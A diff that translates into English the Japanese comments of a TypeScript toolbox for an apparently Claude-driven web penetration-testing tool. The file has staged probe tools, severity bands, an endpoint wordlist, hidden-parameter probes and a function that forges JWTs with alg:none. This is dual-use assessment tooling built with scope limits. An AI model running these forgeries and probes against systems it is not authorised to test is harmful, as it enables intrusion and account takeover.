@@ -1,8 +1,8 @@
-// Claude が操縦するツール箱(in-process MCP)。既存の決定論 primitive を Claude のツールへ格下げ。
-// スコープ/マーカー/レートはツール内で強制(= 安全弁は残すが、人間承認では止めない)。
+// The toolbox Claude drives (in-process MCP). Existing deterministic primitives are demoted to Claude tools.
+// Scope / marker / rate are enforced inside the tools (= the safety valves remain, but we don't stop for human approval).
 //
-// 3 ステージ(調査 / 方法論 / 診断)で使うツールはここに全部定義し、run.ts が allowedTools で
-// ステージごとに見せるツールを絞る(= Claude に一度に全部見せない → 省略を防ぐ)。
+// All tools used across the 3 stages (survey / methodology / diagnose) are defined here; run.ts uses allowedTools
+// to narrow which tools are visible per stage (= don't show Claude everything at once → prevent it from eliding work).
 
 import type { AssessmentStore, Finding, FindingVerdict, Screen, ScopePolicy, Severity } from "@veritas/core";
 import { findingVerdict, isInScope } from "@veritas/core";
@@ -16,113 +16,113 @@ import { z } from "zod";
 import { join } from "node:path";
 import { readFileSync } from "node:fs";
 
-/** attended(手動マルチセッション)で 1 ロール = 1 永続コンテキスト。生きたセッションを保持する。 */
+/** In attended (manual multi-session) mode, 1 role = 1 persistent context. Holds a live session. */
 export interface RoleSession {
   driver: PlaywrightDriver;
-  /** 直近に同期した Cookie ヘッダ(http 経路用)。keepalive で再同期される。 */
+  /** Most recently synced Cookie header (for the http path). Re-synced by keepalive. */
   cookie: string;
 }
 
 export interface PilotSession {
-  /** 現在アクティブなロールの driver。attended では login() でロール間を swap する。 */
+  /** The driver for the currently active role. In attended mode, login() swaps between roles. */
   driver: PlaywrightDriver;
   http: FetchHttpClient;
   evidence: EvidenceStore;
   store: AssessmentStore;
   assessmentId: string;
-  /** runs/<id>/artifacts。画面スクショを screens/<screenId>.png に保存。 */
+  /** runs/<id>/artifacts. Screen screenshots are saved to screens/<screenId>.png. */
   artifactsDir: string;
   scope: ScopePolicy;
   targetUrl: string;
   roleCreds: Map<string, LoginCreds>;
-  /** ロール名 → 事前取得 Cookie ファイルのパス(資格情報の代わり。自動ログインできない壁向け)。 */
+  /** Role name → path to a pre-captured Cookie file (instead of credentials; for walls that can't be auto-logged-in). */
   roleCookieFiles: Map<string, string>;
-  /** ロール名 → 権限の自由記述(例: "全権管理者" / "一般ユーザ(読取のみ)")。auth-diff の高/低権限判断に使う。 */
+  /** Role name → free-form privilege description (e.g. "full admin" / "regular user (read-only)"). Used for the high/low-privilege call in auth-diff. */
   roleDescriptions: Map<string, string>;
   loginLlm: LlmClient;
   currentCookie: string;
-  /** SPA が保持する Bearer JWT(localStorage 等)。cookie 認証でない API(Juice Shop 等)向けに
-   *  http_request / probe_logic が `Authorization: Bearer` として載せる。login() が各ロールで更新。 */
+  /** Bearer JWT held by the SPA (localStorage etc.). So it reaches APIs that don't use cookie auth (Juice Shop etc.),
+   *  http_request / probe_logic send it as `Authorization: Bearer`. login() updates it per role. */
   currentBearer: string;
   currentRole: string;
   findings: Finding[];
   findCounter: number;
-  /** dedup キー(class×endpoint×param)→ 既存 finding。横断エンドポイントの過剰報告を束ねる。 */
+  /** dedup key (class×endpoint×param) → existing finding. Coalesces over-reporting across endpoints. */
   findingsByKey: Map<string, Finding>;
-  /** verify_access の機械判定(正規化 endpoint → verdict)。record_finding が auth-bypass を硬く gate する。 */
+  /** verify_access machine verdict (normalized endpoint → verdict). record_finding hard-gates auth-bypass on it. */
   accessVerdicts: Map<string, AccessVerdict>;
-  /** record_finding 呼び出し回数(新規+マージ)。画面の verdict 判定に使う。 */
+  /** record_finding call count (new + merged). Used for the screen verdict. */
   recordCalls: number;
-  // ── 認証壁サーキットブレーカ用の http 統計(診断プローブの応答) ──
-  /** 診断プローブの総数。 */
+  // ── http stats for the auth-wall circuit breaker (diagnosis probe responses) ──
+  /** Total number of diagnosis probes. */
   httpProbes: number;
-  /** うち 401(認証壁)で弾かれた数。 */
+  /** Of those, how many were rejected with 401 (auth wall). */
   httpAuthWall: number;
-  /** うち 2xx(認証を抜けて通った)数。 */
+  /** Of those, how many got through (2xx, past auth). */
   httpThrough: number;
-  /** 現在の画面で撃った診断プローブ数(画面開始でリセット)。screen_done のカバレッジ・ゲートの裏取りに使う
-   *  (「全部 clean」と自己申告しつつ実は1回も probe してない、を弾く)。 */
+  /** Number of diagnosis probes fired on the current screen (reset when a screen starts). Used to cross-check the screen_done coverage gate
+   *  (rejects "everything is clean" self-reports that actually never probed once). */
   screenProbes: number;
   done: boolean;
   doneSummary: string;
-  /** done の中でも「トークン/利用上限の枯渇で中断」= スキップではなく resume 可能な一時停止。
-   *  立つと最終処理が phase を report に落とさず、診断中だった画面も queued に戻す(再診断できる)。 */
+  /** Even within done, "interrupted by token/usage-limit exhaustion" = not a skip but a resumable pause.
+   *  When set, finalization doesn't drop the phase to report, and screens still being diagnosed are returned to queued (re-diagnosable). */
   paused: boolean;
   model: string | undefined;
-  // ── ステージ運用の状態 ──
-  /** 観測 → Screen 化 + dedup(assess と同じ台帳)。 */
+  // ── stage operation state ──
+  /** Observation → Screen + dedup (the same ledger as assess). */
   inv: InventoryBuilder;
-  /** 訪問済み URL(ハッシュ除去)。 */
+  /** Visited URLs (hash stripped). */
   visited: Set<string>;
-  /** スコープ内・未訪問リンク(調査の残タスク=省略防止の frontier)。 */
+  /** In-scope, unvisited links (survey's remaining tasks = the frontier that prevents eliding work). */
   frontier: Set<string>;
-  /** ignore_paths でモデルが動的に間引いた低価値パスのパターン(CMS コンテンツ木など)。frontier 追加時に弾く。 */
+  /** Low-value path patterns the model dynamically pruned via ignore_paths (CMS content trees etc.). Filtered out when adding to the frontier. */
   ignorePaths: string[];
-  /** 全量抽出モード(--exhaustive)。true なら ignore_paths は無効(全画面マップ)。 */
+  /** Exhaustive extraction mode (--exhaustive). When true, ignore_paths is disabled (map every screen). */
   exhaustive: boolean;
-  /** survey が写像する画面数の上限(--max-survey-screens)。到達したら探索を止める(frontier を空に)。未設定=無制限。 */
+  /** Upper bound on the number of screens survey maps (--max-survey-screens). On reaching it, stop exploration (empty the frontier). Unset = unlimited. */
   maxSurveyScreens?: number;
-  /** 上限到達フラグ(recordObservation が立て、survey_status が「これ以上探索しない」を伝える)。 */
+  /** Cap-reached flag (set by recordObservation; survey_status uses it to signal "explore no further"). */
   surveyCapped?: boolean;
-  /** URL リストのハードロック。true なら recordObservation で発見リンクを frontier に積まない
-   *  (横断クロールせず、シード URL だけをマップする)。 */
+  /** Hard lock on the URL list. When true, recordObservation does not add discovered links to the frontier
+   *  (don't crawl across the site, map only the seed URLs). */
   lockToSeeds: boolean;
-  /** browser_navigate のたびに入力欄スイープ(フォーム/検索を benign 値で送信して新ルート/API を発見)を自動実行。 */
+  /** On every browser_navigate, automatically run an input sweep (submit forms/searches with benign values to discover new routes/APIs). */
   inputSweep: boolean;
-  /** 入力スイープで POST フォームも送信する(=標的にデータを書く)。false なら GET/検索のみ。 */
+  /** In the input sweep, also submit POST forms (= write data to the target). If false, GET/search only. */
   aggressiveForms: boolean;
-  /** A06 で検出版をオンライン CVE DB(OSV/NVD)に照会するか(opt-in: 第三者への egress)。off なら cve_lookup は無効。 */
+  /** Whether to query an online CVE DB (OSV/NVD) for detected versions in A06 (opt-in: egress to a third party). If off, cve_lookup is disabled. */
   cveLookup: boolean;
-  /** screenId → 方法論(攻撃計画)。 */
+  /** screenId → methodology (attack plan). */
   plans: Map<string, string>;
-  /** 診断中の screenId(record_finding / http_request evidence の紐付け先)。 */
+  /** screenId being diagnosed (the anchor for record_finding / http_request evidence). */
   currentScreenId: string | null;
-  /** 直近画面の診断結果(screen_done が設定)。 */
+  /** Diagnosis result for the most recent screen (set by screen_done). */
   screenVerdict: "finding" | "suspected" | "clean" | null;
-  // ── ステージ完了シグナル ──
+  // ── stage completion signals ──
   surveyDone: boolean;
   methodologyDone: boolean;
   screenDone: boolean;
-  /** シナリオ(A04 横断ロジック)ステージの完了シグナル。 */
+  /** Completion signal for the scenario (A04 cross-cutting logic) stage. */
   scenarioDone: boolean;
-  /** フィンガープリント(A06 既知脆弱性コンポーネント)ステージの完了シグナル。 */
+  /** Completion signal for the fingerprint (A06 known-vulnerable component) stage. */
   fingerprintDone: boolean;
-  /** OOB(Burp Collaborator)基盤への接続。set されていれば probe_oob が使える(BURP_AUDIT_API 経由)。
-   *  ブラインド SSRF/XXE/SQLi 等の out-of-band 確証用。未設定なら probe_oob は not-available を返す。 */
+  /** Connection to the OOB (Burp Collaborator) infrastructure. If set, probe_oob is usable (via BURP_AUDIT_API).
+   *  For out-of-band confirmation of blind SSRF/XXE/SQLi etc. If unset, probe_oob returns not-available. */
   oob?: BurpAuditConn;
-  // ── attended(手動マルチセッション認証)──
-  /** 手動ログイン済みのロール別ライブセッション。未指定 = 通常(単一コンテキスト)モード。 */
+  // ── attended (manual multi-session auth) ──
+  /** Per-role live sessions that were manually logged in. Unset = normal (single-context) mode. */
   roleSessions?: Map<string, RoleSession>;
 }
 
-/** ステージごとに見せるツール(基底名)。run.ts が `mcp__veritas__` を付けて allowedTools に渡す。 */
+/** Tools shown per stage (base names). run.ts prefixes them with `mcp__veritas__` and passes them to allowedTools. */
 export const STAGE_TOOLS = {
   survey: ["browser_navigate", "browser_fill", "browser_click", "login", "probe_paths", "ignore_paths", "survey_status", "survey_done"],
   methodology: ["get_inventory", "record_methodology", "methodology_done"],
   diagnose: ["get_screen", "login", "http_request", "probe_params", "probe_xss", "probe_dom_xss", "probe_stored_xss", "probe_ssti", "probe_sqli", "probe_cmdi", "probe_traversal", "probe_redirect", "probe_jwt", "probe_csrf", "probe_oob", "probe_logic", "analyze_session", "verify_access", "probe_idor", "browser_navigate", "browser_fill", "browser_click", "browser_upload", "record_finding", "screen_done"],
-  // シナリオ(A04 横断ロジック): inventory 俯瞰 + 多段リクエスト連鎖を probe_scenario で撃つ。画面診断の後に1回。
+  // scenario (A04 cross-cutting logic): overview the inventory + fire multi-step request chains via probe_scenario. Once, after per-screen diagnosis.
   scenario: ["get_inventory", "login", "http_request", "probe_scenario", "record_finding", "scenario_done"],
-  // フィンガープリント(A06 既知脆弱コンポーネント): fingerprint_scan で版を集め、(opt-in で cve_lookup)既知 CVE を評価して記録。
+  // fingerprint (A06 known-vulnerable components): fingerprint_scan to collect versions, evaluate known CVEs (cve_lookup opt-in) and record.
   fingerprint: ["fingerprint_scan", "cve_lookup", "http_request", "record_finding", "fingerprint_done"],
 } as const;
 
@@ -134,9 +134,9 @@ function pick(h: Record<string, string>, keys: string[]): Record<string, string>
   return o;
 }
 
-/** frontier/visited の正準キー。SPA ルート(#/foo, #!/foo)は別画面の識別子として残し、
- *  ページ内アンカー(#, #section, 空の #/)は捨てる。これで hash ルーティングの SPA(Angular 等)が
- *  系統的にマップされる。画面レベルの重複は domSkeletonHash が別途担保するので過剰増殖はしない。 */
+/** Canonical key for frontier/visited. Keep SPA routes (#/foo, #!/foo) as distinct screen identifiers, and
+ *  drop in-page anchors (#, #section, empty #/). This lets hash-routed SPAs (Angular etc.) be mapped
+ *  systematically. Screen-level duplicates are handled separately by domSkeletonHash, so this doesn't over-proliferate. */
 export function stripHash(u: string): string {
   const i = u.indexOf("#");
   if (i < 0) return u;
@@ -148,29 +148,29 @@ function maxSev(a: Severity, b: Severity): Severity {
   return SEV_ORDER.indexOf(a) >= SEV_ORDER.indexOf(b) ? a : b;
 }
 
-/** カテゴリごとの重大度バンド [min,max]。record_finding がモデルの選択をこのバンドに clamp して一貫性を担保する
- *  (同じクラスで High/Medium が混ざる問題の是正)。文脈による上下は band 内でのみ許す。 */
+/** Per-category severity band [min,max]. record_finding clamps the model's choice into this band for consistency
+ *  (fixes the same class sometimes coming out High, sometimes Medium). Context-driven up/down is allowed only within the band. */
 const SEVERITY_BAND: Partial<Record<string, { min: Severity; max: Severity }>> = {
-  rce: { min: "critical", max: "critical" }, // RCE/CMDi は常時 Critical(operator 方針)
-  ssti: { min: "high", max: "critical" }, // SSTI = RCE 相当(純テンプレ eval のみなら High)
-  sqli: { min: "high", max: "critical" }, // 認証バイパス/全DB露出なら Critical
+  rce: { min: "critical", max: "critical" }, // RCE/CMDi is always Critical (operator policy)
+  ssti: { min: "high", max: "critical" }, // SSTI = RCE-equivalent (High only if pure template eval)
+  sqli: { min: "high", max: "critical" }, // Critical if auth bypass / full DB exposure
   "auth-bypass": { min: "high", max: "critical" },
   idor: { min: "medium", max: "high" },
-  "idor-write": { min: "high", max: "critical" }, // 他ユーザデータの改変
-  "path-traversal": { min: "medium", max: "critical" }, // 任意ファイル読取=High、RCE 化=Critical
+  "idor-write": { min: "high", max: "critical" }, // tampering with another user's data
+  "path-traversal": { min: "medium", max: "critical" }, // arbitrary file read = High, RCE-capable = Critical
   ssrf: { min: "medium", max: "high" },
-  xxe: { min: "high", max: "critical" }, // 任意ファイル読取/SSRF 連鎖
-  "xss-stored": { min: "medium", max: "high" }, // 永続・他ユーザ影響
-  "xss-reflected": { min: "low", max: "medium" }, // 反射 XSS は原則 Medium
+  xxe: { min: "high", max: "critical" }, // arbitrary file read / SSRF chain
+  "xss-stored": { min: "medium", max: "high" }, // persistent, affects other users
+  "xss-reflected": { min: "low", max: "medium" }, // reflected XSS is Medium as a rule
   "open-redirect": { min: "low", max: "medium" },
   csrf: { min: "low", max: "medium" },
   "price-tampering": { min: "high", max: "critical" },
   "qty-tampering": { min: "high", max: "critical" },
   "workflow-bypass": { min: "medium", max: "high" },
-  "mass-assignment": { min: "high", max: "critical" }, // 権限昇格
+  "mass-assignment": { min: "high", max: "critical" }, // privilege escalation
   "race-condition": { min: "medium", max: "high" },
-  "secret-exposure": { min: "medium", max: "critical" }, // 何が漏れたかで上下
-  "vulnerable-component": { min: "low", max: "critical" }, // CVE 依存で広い(suspected は別途 High+ 縛り)
+  "secret-exposure": { min: "medium", max: "critical" }, // up/down depending on what leaked
+  "vulnerable-component": { min: "low", max: "critical" }, // broad, CVE-dependent (suspected is separately restricted to High+)
   "info-disclosure": { min: "info", max: "medium" },
   session: { min: "low", max: "high" },
   "rate-limit": { min: "info", max: "medium" },
@@ -178,7 +178,7 @@ const SEVERITY_BAND: Partial<Record<string, { min: Severity; max: Severity }>> =
   misconfig: { min: "low", max: "high" },
 };
 
-/** モデルが選んだ severity をカテゴリのバンドに収める(バンド外なら min/max に clamp)。バンド未定義はそのまま。 */
+/** Fit the model's chosen severity into the category's band (clamp to min/max if outside). Bands left undefined pass through. */
 export function normalizeSeverity(category: string, chosen: Severity): Severity {
   const band = SEVERITY_BAND[category];
   if (!band) return chosen;
@@ -188,12 +188,12 @@ export function normalizeSeverity(category: string, chosen: Severity): Severity 
   return chosen;
 }
 
-/** vulnClass の自由文 → 粗いカテゴリ(dedup キー用)。同じ穴の言い換えを1つに畳む。
- *  正準カテゴリ(CATEGORIES)を渡された場合はそのまま返す(冪等。xss-stored の誤畳み防止)。 */
+/** vulnClass free text → coarse category (for the dedup key). Folds paraphrases of the same hole into one.
+ *  If passed a canonical category (CATEGORIES), returns it as-is (idempotent; prevents mis-folding xss-stored). */
 export function coarseClass(vulnClass: string): string {
   const s = vulnClass.toLowerCase().trim();
-  if ((CATEGORIES as readonly string[]).includes(s)) return s; // 正準カテゴリはそのまま(冪等)
-  // ハイフン/アンダースコアを空白に正規化(methodology の "SQL-injection"/"stored-XSS" 等の言い換えに強く)。
+  if ((CATEGORIES as readonly string[]).includes(s)) return s; // canonical categories pass through (idempotent)
+  // Normalize hyphens/underscores to spaces (robust to methodology paraphrases like "SQL-injection"/"stored-XSS").
   const sn = s.replace(/[_-]+/g, " ");
   if (/stored xss|persistent xss/.test(sn)) return "xss-stored";
   if (/xss|cross\s?site script/.test(sn)) return "xss-reflected";
@@ -213,8 +213,8 @@ export function coarseClass(vulnClass: string): string {
   return s.replace(/[^a-z0-9]+/g, "-").replace(/^-|-$/g, "").slice(0, 24) || "other";
 }
 
-/** エンドポイントを inventory と同じ規則で正規化(/orders/o10 と /orders/{id} を同一視)。
- *  具体 URL(/orders/o10)もテンプレ(/orders/{id})も同じキーに落とす。 */
+/** Normalize an endpoint by the same rules as inventory (treat /orders/o10 and /orders/{id} as the same).
+ *  Both a concrete URL (/orders/o10) and a template (/orders/{id}) collapse to the same key. */
 export function normEndpoint(ep: string, base: string): string {
   let path: string;
   try {
@@ -229,12 +229,12 @@ export function normEndpoint(ep: string, base: string): string {
   }
 }
 
-/** finding dedup キー = (粗カテゴリ × 正規化エンドポイント × param)。同一穴の重複報告を1つに束ねる。 */
+/** finding dedup key = (coarse category × normalized endpoint × param). Coalesces duplicate reports of the same hole into one. */
 export function dedupKey(vulnClass: string, endpoint: string, param: string | undefined, base: string): string {
   return `${coarseClass(vulnClass)}::${normEndpoint(endpoint, base)}::${param ?? ""}`;
 }
 
-/** record_finding の正準クラス(分類の一貫性 + 安定した dedup キー)。 */
+/** Canonical classes for record_finding (classification consistency + stable dedup key). */
 export const CATEGORIES = [
   "idor",
   "idor-write",
@@ -251,12 +251,12 @@ export const CATEGORIES = [
   "session",
   "csrf",
   "info-disclosure",
-  "secret-exposure", // 露出した資格情報/秘密(impact オラクルの secret/file-leak で確証)
+  "secret-exposure", // exposed credentials/secrets (confirmed by the impact oracle's secret/file-leak)
   "misconfig",
   "rate-limit",
   "headers",
-  "vulnerable-component", // A06: 既知脆弱性のある古いコンポーネント(server/middleware/frontend lib)
-  // A04 ビジネスロジック(差分テスト verifier = probe_logic で確証)
+  "vulnerable-component", // A06: outdated component with a known vulnerability (server/middleware/frontend lib)
+  // A04 business logic (confirmed by the differential-test verifier = probe_logic)
   "price-tampering",
   "qty-tampering",
   "workflow-bypass",
@@ -265,20 +265,20 @@ export const CATEGORIES = [
   "other",
 ] as const;
 
-/** ビジネスロジック系(probe_logic の差分テスト + record_finding のマーカーベース確証を使う)。 */
+/** Business-logic categories (use probe_logic's differential test + record_finding's marker-based confirmation). */
 export const BUSINESS_LOGIC_CATEGORIES = new Set<string>(["price-tampering", "qty-tampering", "workflow-bypass", "mass-assignment"]);
 
-/** 「特定マーカーがレスポンスに現れたら確証」型のカテゴリ(長さ差分でなくマーカー有無で判定)。
- *  ビジネスロジック(probe_logic/probe_scenario)＋ 反射 XSS(未エスケープ反射)＋ open-redirect(Location が OOB)。 */
+/** Categories of the "confirmed when a specific marker appears in the response" type (judged by marker presence, not length delta).
+ *  Business logic (probe_logic/probe_scenario) + reflected XSS (unescaped reflection) + open-redirect (Location is the OOB). */
 export const MARKER_BASED_CATEGORIES = new Set<string>([...BUSINESS_LOGIC_CATEGORIES, "xss-reflected", "xss-stored", "open-redirect", "ssti", "secret-exposure"]);
 
-/** verdict:"suspected" を許さないカテゴリ。決定的に観測できる or 低価値な hygiene 系はリードにする意味が薄く
- *  ノイズになる(rate-limit/version-disclosure を "suspected" で量産していた)。これらは confirmed か skip の二択。 */
+/** Categories that don't allow verdict:"suspected". Deterministically observable, or low-value hygiene classes, make poor leads
+ *  and just add noise (rate-limit/version-disclosure were being mass-produced as "suspected"). These are confirmed-or-skip only. */
 export const SUSPECT_EXCLUDED_CATEGORIES = new Set<string>(["rate-limit", "headers", "info-disclosure", "misconfig"]);
 
-/** probe_paths の「簡単なディレクトリリスト」= 未リンク endpoint を踏むための厳選ワードリスト。
- *  ※ logout/signout 系は **入れない**。認証済みセッションで GET するとサーバ側セッションが破棄され、
- *    以降の認証診断が全滅する(自滅)。isSessionDestroyingPath でも二重に弾く。 */
+/** probe_paths' "simple directory list" = a curated wordlist for hitting unlinked endpoints.
+ *  ※ Do **not** include logout/signout paths. GETting them under an authenticated session destroys the server-side session,
+ *    wiping out all subsequent auth diagnosis (self-sabotage). isSessionDestroyingPath filters them out a second time too. */
 const PATH_WORDLIST = [
   "/admin", "/administrator", "/api", "/api/profile", "/api/users", "/api/user", "/api/orders", "/api/admin", "/api/config",
   "/account", "/account/edit", "/profile", "/settings", "/users", "/user", "/dashboard",
@@ -289,23 +289,23 @@ const PATH_WORDLIST = [
   "/swagger", "/api-docs", "/graphql", "/.well-known/security.txt",
 ];
 
-/** セッションを破棄する副作用を持つパス(logout/signout/SSO ログアウト等)。認証済みアセスメントで
- *  自動踏破するとサーバ側セッションが消えて以降の認証診断が全部死ぬため、probe_paths は絶対に踏まない。 */
+/** Paths with a session-destroying side effect (logout/signout/SSO logout etc.). Auto-traversing them in an authenticated
+ *  assessment wipes the server-side session and kills all subsequent auth diagnosis, so probe_paths must never hit them. */
 const SESSION_DESTROYING = /(^|\/)(logout|log-out|logoff|log-off|signout|sign-out|sign_out|disconnect|(sso|saml|oidc|oauth2?|account|auth|session|user)\/(logout|signout|sign-out))(\/|$|\?|#)/i;
 export function isSessionDestroyingPath(pathOrUrl: string): boolean {
   let p = pathOrUrl;
   try {
     p = new URL(pathOrUrl, "http://x/").pathname;
   } catch {
-    /* 相対/不正はそのまま判定 */
+    /* relative/malformed: judge as-is */
   }
   return SESSION_DESTROYING.test(p);
 }
 
-/** 外部到達を試さない安全マーカー(open-redirect / 反射検出用、非解決ドメイン)。 */
+/** A safe marker that never attempts external reachability (for open-redirect / reflection detection; a non-resolving domain). */
 const OOB_MARKER = "veritas-oob.example";
 
-/** probe_params の高シグナルな隠しパラメータ集合(アプリが普段送らないもの)。 */
+/** High-signal hidden-parameter set for probe_params (ones the app doesn't normally send). */
 const PARAM_PROBES: Array<{ name: string; value: string; kind: "idor" | "redirect" | "debug" | "file" }> = [
   ...["id", "userId", "user_id", "user", "account", "accountId", "uid", "customerId", "orderId", "order"].map(
     (name) => ({ name, value: "1", kind: "idor" as const }),
@@ -319,15 +319,15 @@ const PARAM_PROBES: Array<{ name: string; value: string; kind: "idor" | "redirec
   ),
 ];
 
-/** probe_scenario の {{var}} 置換。文字列中の {{name}} を vars[name] で差し替え(未定義は空文字)。 */
+/** {{var}} substitution for probe_scenario. Replaces {{name}} in the string with vars[name] (undefined → empty string). */
 export function substVars(input: string, vars: Record<string, string>): string {
   return input.replace(/\{\{\s*([A-Za-z0-9_.]+)\s*\}\}/g, (_, k: string) => vars[k] ?? "");
 }
 
-/** レスポンス本文から値を抽出(probe_scenario の capture)。まず JSON パス(dot/array index 例 data.0.id)、
- *  失敗したら正規表現の第1キャプチャ。取れなければ null。前段の id/token を後段に差し込むための土台。 */
+/** Extract a value from a response body (probe_scenario's capture). First a JSON path (dot/array index, e.g. data.0.id),
+ *  else the regex's first capture group. Returns null if nothing found. The basis for feeding an earlier id/token into a later step. */
 export function extractValue(body: string, expr: string): string | null {
-  // ① JSON パス
+  // ① JSON path
   try {
     const json = JSON.parse(body);
     let cur: unknown = json;
@@ -340,7 +340,7 @@ export function extractValue(body: string, expr: string): string | null {
   } catch {
     /* not json — fall through to regex */
   }
-  // ② 正規表現(第1キャプチャ、無ければマッチ全体)
+  // ② regex (first capture group, or the whole match if none)
   try {
     const m = new RegExp(expr).exec(body);
     if (m) return m[1] ?? m[0];
@@ -350,8 +350,8 @@ export function extractValue(body: string, expr: string): string | null {
   return null;
 }
 
-/** 現在ロールの認証材料(cookie + Bearer JWT)をヘッダ化。cookie 認証でない API(Juice Shop 等の
- *  `Authorization: Bearer <localStorage.token>`)にも届くよう bearer を載せる。呼び出し側ヘッダで上書き可能。 */
+/** Turn the current role's auth material (cookie + Bearer JWT) into headers. Includes the bearer so it also reaches
+ *  APIs that don't use cookie auth (Juice Shop's `Authorization: Bearer <localStorage.token>` etc.). Caller headers can override. */
 export function authHeaders(s: Pick<PilotSession, "currentCookie" | "currentBearer">): Record<string, string> {
   return {
     ...(s.currentCookie ? { cookie: s.currentCookie } : {}),
@@ -367,8 +367,8 @@ function b64urlEncode(s: string): string {
   return Buffer.from(s, "utf8").toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
 }
 
-/** JWT を alg:none で再エンコード(署名空)。サーバが署名検証していなければ受理される = 致命的偽造。
- *  header.alg を "none" に、payload はそのまま(mutate で claim 改変も可)。失敗時 null。 */
+/** Re-encode a JWT with alg:none (empty signature). Accepted if the server isn't verifying the signature = fatal forgery.
+ *  Sets header.alg to "none", keeps payload as-is (mutate can also alter claims). Returns null on failure. */
 export function forgeAlgNone(token: string, mutate?: (claims: Record<string, unknown>) => void): string | null {
   const parts = token.split(".");
   if (parts.length < 2 || !parts[0] || !parts[1]) return null;
@@ -385,8 +385,8 @@ export function forgeAlgNone(token: string, mutate?: (claims: Record<string, unk
   return `${b64urlEncode(JSON.stringify(header))}.${b64urlEncode(JSON.stringify(payload))}.`;
 }
 
-/** ignore_paths のパターン照合。`*` をワイルドカードとして扱い、`*` を含まないパターンは前方一致。
- *  例: "/news/" は /news/ 配下すべて、"/artikel/*" も同様、"/p" は /p で始まる全パス。URL/相対どちらも path で判定。 */
+/** ignore_paths pattern matching. Treats `*` as a wildcard; patterns without a `*` are prefix matches.
+ *  e.g. "/news/" matches everything under /news/, "/artikel/*" likewise, "/p" matches every path starting with /p. URL or relative, judged on the path. */
 export function pathIsIgnored(urlOrPath: string, patterns: ReadonlyArray<string>, base: string): boolean {
   if (patterns.length === 0) return false;
   let path: string;
@@ -407,8 +407,8 @@ export function pathIsIgnored(urlOrPath: string, patterns: ReadonlyArray<string>
   });
 }
 
-/** login() で使えるロールの一覧(名前 + 任意の権限説明)。attended は生セッションのキー(純手動ロール含む)、
- *  通常は資格情報 + Cookie ファイルのキー。description は auth-diff で高/低権限を見分ける材料。 */
+/** The roles usable by login() (name + optional privilege description). In attended mode, the live-session keys (including pure-manual roles);
+ *  normally, the credentials + Cookie-file keys. description is the material auth-diff uses to tell high/low privilege apart. */
 function availableRoles(s: PilotSession): Array<{ name: string; description?: string }> {
   const names = s.roleSessions ? [...s.roleSessions.keys()] : [...new Set([...s.roleCreds.keys(), ...s.roleCookieFiles.keys()])];
   return names.map((name) => {
@@ -417,8 +417,8 @@ function availableRoles(s: PilotSession): Array<{ name: string; description?: st
   });
 }
 
-/** operator 提供の Cookie ファイルを読む。生 Cookie ヘッダ("a=1; b=2")/ Playwright storageState JSON
- *  ({cookies:[...]})/ 単純配列([{name,value}])を自動判別 → http 用ヘッダ + ブラウザ注入用 cookie。 */
+/** Read an operator-supplied Cookie file. Auto-detects a raw Cookie header ("a=1; b=2") / a Playwright storageState JSON
+ *  ({cookies:[...]}) / a simple array ([{name,value}]) → an http header + cookies for browser injection. */
 export function loadCookieFile(
   path: string,
   targetUrl: string,
@@ -430,7 +430,7 @@ export function loadCookieFile(
   } catch {
     host = "";
   }
-  // JSON(storageState or 配列)を試す
+  // try JSON (storageState or array)
   try {
     const j = JSON.parse(raw) as unknown;
     const arr = Array.isArray(j) ? j : ((j as { cookies?: unknown[] }).cookies ?? []);
@@ -439,9 +439,9 @@ export function loadCookieFile(
       .map((c) => ({ name: c.name as string, value: String(c.value ?? ""), domain: c.domain || host, path: c.path || "/" }));
     if (bc.length > 0) return { header: bc.map((c) => `${c.name}=${c.value}`).join("; "), browserCookies: bc };
   } catch {
-    /* JSON でない → 生ヘッダ扱い */
+    /* not JSON → treat as a raw header */
   }
-  // 生 Cookie ヘッダ: "Cookie: a=1; b=2" または "a=1; b=2"
+  // raw Cookie header: "Cookie: a=1; b=2" or "a=1; b=2"
   const header = raw.replace(/^cookie:\s*/i, "").split(/\r?\n/)[0]?.trim() ?? "";
   const browserCookies = header
     .split(";")
@@ -455,20 +455,20 @@ export function loadCookieFile(
   return { header, browserCookies };
 }
 
-// ── auth-bypass の hybrid 判定: 機械が「明白に認証が効いてる」を veto、グレーだけ Claude に渡す ──
+// ── hybrid judgment for auth-bypass: the machine vetoes "auth is clearly enforced", only gray cases go to Claude ──
 const LOGIN_MARKERS = /sign[\s-]?in|log[\s-]?in|\bpassword\b|forbidden|unauthorized|access denied|ログイン|サインイン|認証が必要|権限/i;
 function looksLikeLogin(body: string): boolean {
   return LOGIN_MARKERS.test(body.slice(0, 4000));
 }
 
-/** attended の keepalive 用: ロールのコンテキストがログインへ戻された(= セッション失効)かを判定。
- *  URL パスが login/signin/auth/sso 系、または可視テキストがログイン文言 → dead 扱い(再ログイン要求)。 */
+/** For attended keepalive: judge whether a role's context was bounced back to login (= session expired).
+ *  If the URL path is login/signin/auth/sso-ish, or the visible text is login wording → treated as dead (needs re-login). */
 export function sessionLooksDead(snap: { url: string; visibleText: string }): boolean {
   let path = snap.url.toLowerCase();
   try {
     path = new URL(snap.url).pathname.toLowerCase();
   } catch {
-    /* 相対/不正 URL はそのまま小文字で判定 */
+    /* relative/malformed URL: judge as-is, lowercased */
   }
   if (/(^|\/)(login|signin|sign-in|auth|sso|account\/login)(\/|$|\?)/.test(path)) return true;
   return looksLikeLogin(snap.visibleText);
@@ -476,9 +476,9 @@ export function sessionLooksDead(snap: { url: string; visibleText: string }): bo
 
 export type AccessVerdict = "not_bypass" | "needs_judgment" | "inconclusive";
 
-/** 未認証/認証済みレスポンス → auth-bypass の機械判定。
- *  302→login / 401 / 403 / 非200 / ログイン本文 は **not_bypass(認証が効いてる、覆せない)**。
- *  未認証200 かつ 非ログインだけ **needs_judgment**(Claude が本文を読んで保護データか判断)。 */
+/** Unauthenticated/authenticated responses → machine verdict for auth-bypass.
+ *  302→login / 401 / 403 / non-200 / login body are all **not_bypass (auth is enforced, can't be overturned)**.
+ *  Only unauth 200 AND non-login is **needs_judgment** (Claude reads the body and decides if it's protected data). */
 export function classifyAccess(
   unauth: { status: number; location?: string; body: string },
   auth: { status: number; body: string } | null,
@@ -490,24 +490,24 @@ export function classifyAccess(
   if (unauth.status !== 200)
     return { verdict: "not_bypass", reason: `unauth → ${unauth.status} (no protected content)` };
   if (looksLikeLogin(unauth.body)) return { verdict: "not_bypass", reason: "unauth body is a login/denied page, not protected content" };
-  // ここまで来たら unauth 200 & 非ログイン = グレー
+  // reaching here means unauth 200 & non-login = gray
